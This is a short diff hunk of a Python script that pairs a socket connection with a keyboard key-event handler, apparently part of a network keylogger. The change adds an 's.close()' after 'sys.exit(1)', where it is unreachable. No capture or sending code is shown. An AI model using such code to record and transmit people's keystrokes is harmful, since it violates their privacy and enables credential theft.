@@ -15,6 +15,7 @@ try:
 except:
     print("\n[!] Se ha acontecido un error en la conexión\n")
     sys.exit(1)
+    s.close()
 
 def on_key_event(event):
     if event.event_type == keyboard.KEY_UP:
